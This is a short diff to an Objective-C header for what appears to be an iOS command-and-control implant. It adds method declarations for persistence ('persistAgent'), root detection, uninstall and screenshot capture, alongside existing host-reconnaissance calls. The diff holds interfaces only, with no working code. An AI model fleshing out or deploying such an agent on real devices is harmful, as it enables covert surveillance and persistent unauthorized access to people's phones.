@@ -5,8 +5,12 @@
 #import <sys/sysctl.h>
 #import <UIKit/UIKit.h>
 #include <mach-o/dyld.h>
-// #import <IOKit/IOKitLib.h>
+
+// #import <IOKit/graphics/IOMobileFramebuffer.h>
+// #import <IOSurface/IOSurface.h>
 // #import <CoreGraphics/CoreGraphics.h>
+// #import <ImageIO/ImageIO.h>
+
 
 #import "C2Task.h"
 
@@ -16,12 +20,15 @@
 + (NSString *)getExternalIPAddress;
 + (NSString *)getArchitecture;
 + (NSInteger)getPID;
++ (BOOL)isRootUser;
 + (NSString *)getUser;
 + (NSString *)getHost;
 + (NSString *)getOS;
 + (NSString *)getDomain;
-+ (BOOL)deleteExecutable;
++ (BOOL)uninstallAgent;
++ (BOOL)persistAgent;
++ (BOOL)agentIsInstalled;
 + (NSString *)getProcessName;
-+ (void)takeScreenshotWithTask:(C2Task *)task;
++ (void)takeScreenshotWithTask:(id)task;
 
 @end
